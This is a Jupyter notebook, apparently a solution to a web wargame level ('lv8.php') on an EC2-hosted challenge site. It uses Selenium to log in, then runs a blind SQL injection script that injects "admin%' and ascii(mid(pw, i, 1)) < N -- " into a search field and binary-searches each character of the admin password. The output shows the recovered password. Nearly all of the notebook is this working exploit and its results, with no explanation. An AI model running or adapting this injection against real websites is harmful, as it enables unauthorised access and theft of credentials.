{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 필요한 라이브러리 import\n",
    "from selenium import webdriver\n",
    "from bs4 import BeautifulSoup\n",
    "import pandas as pd\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver = webdriver.Chrome('./chromedriver')\n",
    "driver.get('http://ec2-54-180-137-70.ap-northeast-2.compute.amazonaws.com:8089/')\n",
    "\n",
    "elem_login = driver.find_element_by_name('mailaddr')\n",
    "elem_login.clear()\n",
    "elem_login.send_keys('fetch@ajou.ac.kr')\n",
    "xpath = '//*[@id=\"main\"]/form/table/tbody/tr[3]/td/input'\n",
    "driver.find_element_by_xpath(xpath).click()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1: c_min: 51.0 c_max: 51.5\n",
      "3\n",
      "2: c_min: 112.0 c_max: 112.5\n",
      "3p\n",
      "3: c_min: 57.0 c_max: 57.5\n",
      "3p9\n",
      "4: c_min: 119.0 c_max: 119.5\n",
      "3p9w\n",
      "5: c_min: 49.0 c_max: 49.5\n",
      "3p9w1\n",
      "6: c_min: 100.0 c_max: 100.5\n",
      "3p9w1d\n",
      "7: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\n",
      "8: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\n",
      "9: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\n",
      "10: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\n",
      "11: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\n",
      "12: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "13: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "14: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "15: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "16: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "17: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "18: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "19: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "20: c_min: 0.0 c_max: 0.5\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n",
      "3p9w1d\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n"
     ]
    }
   ],
   "source": [
    "driver.get('http://ec2-54-180-137-70.ap-northeast-2.compute.amazonaws.com:8089/q/lv8.php')\n",
    "\n",
    "index = 20  # 비밀번호 최대 글자 수\n",
    "code = 128  # ASCII 코드 표\n",
    "password = ''\n",
    "\n",
    "print('Searching', end='')\n",
    "for i in range(1, index + 1):\n",
    "    c_max = float(code)\n",
    "    c_min = 0.0\n",
    "    while c_max.is_integer() and c_min.is_integer():\n",
    "        c_mid = (c_max + c_min) / 2\n",
    "        \n",
    "        elem_id = driver.find_element_by_name('search')\n",
    "        elem_id.clear()\n",
    "        elem_id.send_keys(\"admin%' and ascii(mid(pw, \" + str(i) + \", 1)) < \" + str(c_mid) + \" -- \")\n",
    "        xpath = '/html/body/form[1]/input[2]'\n",
    "        driver.find_element_by_xpath(xpath).click()\n",
    "        time.sleep(0.5)\n",
    "\n",
    "        html = driver.page_source\n",
    "        soup = BeautifulSoup(html, 'html.parser')\n",
    "        h = soup.select('body')[0].text\n",
    "        \n",
    "        if 'admin*' in h:\n",
    "            c_max = c_mid\n",
    "        else:\n",
    "            c_min = c_mid\n",
    "\n",
    "    if type(c_max) == float:\n",
    "        password += chr(int(c_min))\n",
    "    else:\n",
    "        password += chr(int(c_max))\n",
    "        \n",
    "    if c_max < 1 or c_min < 1:\n",
    "        break\n",
    "    \n",
    "    print(' ... ' + str(i), end='')\n",
    "    \n",
    "print('\\nPassword: ', end='')\n",
    "print(password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
